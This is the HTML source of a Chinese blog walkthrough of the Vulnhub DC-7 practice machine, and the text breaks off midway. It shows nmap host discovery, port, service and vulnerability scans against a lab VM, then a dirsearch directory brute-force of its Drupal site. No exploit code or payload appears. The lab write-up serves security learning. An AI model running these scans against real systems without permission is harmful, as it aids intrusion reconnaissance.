<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">Vulnhub - DC-7 | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="DC-7

 https://www.vulnhub.com/entry/dc-7,356/
 

端口扫描主机发现

1. 探测存活主机，`178`是靶机
    
    
    
2. 探测主机所有开放端口
    
    
    
3. 探测服务版本以及系统版本
    
    
    
4. 扫描漏洞
    
    
    

web渗透

1. 访问页面，发现是 `Dr..." data-next-head=""/><meta property="og:title" content="Vulnhub - DC-7 | Sunset Blog" data-next-head=""/><meta property="og:description" content="DC-7

 https://www.vulnhub.com/entry/dc-7,356/
 

端口扫描主机发现

1. 探测存活主机，`178`是靶机
    
    
    
2. 探测主机所有开放端口
    
    
    
3. 探测服务版本以及系统版本
    
    
    
4. 扫描漏洞
    
    
    

web渗透

1. 访问页面，发现是 `Dr..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/02/VulnhubDC-7" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-02" data-next-head=""/><meta property="article:modified_time" content="2025-04-02" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Vulnhub" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Vulnhub - DC-7" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/02/VulnhubDC-7" data-next-head=""/><link rel="preload" href="/_next/static/css/e6dcfa5be8702d82.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-04-02","description":"DC-7\n\n https://www.vulnhub.com/entry/dc-7,356/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`178`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1. 访问页面，发现是 `Dr...","mainEntityOfPage":{"@type":"WebPage","@id":"https://sunsetaction.top/2025/04/02/VulnhubDC-7"},"headline":"Vulnhub - DC-7","image":["https://sunsetaction.top/images/logo.png"],"dateModified":"2025-04-02","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://sunsetaction.top/images/logo.png"}}}</script><link rel="stylesheet" href="/_next/static/css/e6dcfa5be8702d82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/147-e33b339acc3d8930.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-1aff2f82080a52f7.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_buildManifest.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">Vulnhub - DC-7</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Vulnhub</span></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubDC-7","contentHtml":"\u003ch1\u003eDC-7\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/dc-7,356/\"\u003ehttps://www.vulnhub.com/entry/dc-7,356/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e178\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                 \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-03 13:30 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00037\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00030\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eA0\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00037\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FE:CA:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-03 13:31 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eA0\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p80,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e     \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-03 13:32 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e7.4\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e+\u003cspan class=\"hljs-title function_ invoke__\"\u003edeb9u6\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e ((Debian))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eA0\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-03 13:33 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.178\u003c/span\u003e\nHost is up (\u003cspan class=\"hljs-number\"\u003e0.00073\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.178\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.178:80/\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: user-login-form\n|     Form action: /user/login\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: user-login-form\n|     Form action: /user/login\n|     \n|     Path: http://192.168.75.178:80/user/login\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/user/password\n|     Form id: user-pass\n|     Form action: /user/password\n|     \n|     Path: http://192.168.75.178:80/user/password\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node/help\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node\n|     Form id: search-block-form\n|     Form action: /search/node\n|     \n|     Path: http://192.168.75.178:80/search/node/\n|     Form id: search-form\n|     Form action: /search/node/\n|     \n|     Path: http://192.168.75.178:80/search/node/\n|     Form id: search-block-form\n|_    Form action: /search/node\n|_http-stored-xss: Couldn'\u003c/span\u003et find any stored XSS vulnerabilities.\n| http-\u003cspan class=\"hljs-keyword\"\u003eenum\u003c/span\u003e: \n|   /rss.xml: RSS or Atom feed\n|   /robots.txt: Robots file\n|   /INSTALL.txt: Drupal file\n|   /: Drupal version \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e \n|_  /README.txt: Interesting, a readme.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问页面，发现是 \u003ccode\u003eDrupal\u003c/code\u003eCMS\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image36.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\nWelcome to DC-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\nDC-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e introduces some \u003cspan class=\"hljs-string\"\u003e\"new\"\u003c/span\u003e concepts, but I\u003cspan class=\"hljs-string\"\u003e'll leave you to figure out what they are.  :-)\nWhile this challenge isn'\u003c/span\u003et \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e that technical, \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e you need to resort to brute forcing \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e a dictionary attacks, you probably won\u003cspan class=\"hljs-string\"\u003e't succeed.\nWhat you will have to do, is to think \"outside\" the box.\nWay \"outside\" the box.  :-)\n@DC7USER\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e爆破目录看看，好像没有什么实质性的东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n//\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e] Starting:                                                                                                                                                                                             \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  315B  - /core  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/core/            \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  340B  - /forum/install/install.php  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/forum/install/core/install.php\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:02] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /index.php                                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  326B  - /install.php  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/core/install.php\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:06] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  342B  - /install.php?profile=default  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/core/install.php?profile=default\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  104B  - /INSTALL.txt                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    7KB - /LICENSE.txt                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  318B  - /modules  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/modules/      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:03] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /node                                             \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:04] \u003cspan class=\"hljs-number\"\u003e406\u003c/span\u003e -   68B  - /node/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e?_\u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e=hal_json                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  319B  - /profiles  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e/profiles/    \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /README.txt                                       \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  584B  - /robots.txt                                       \n[\u003cspan 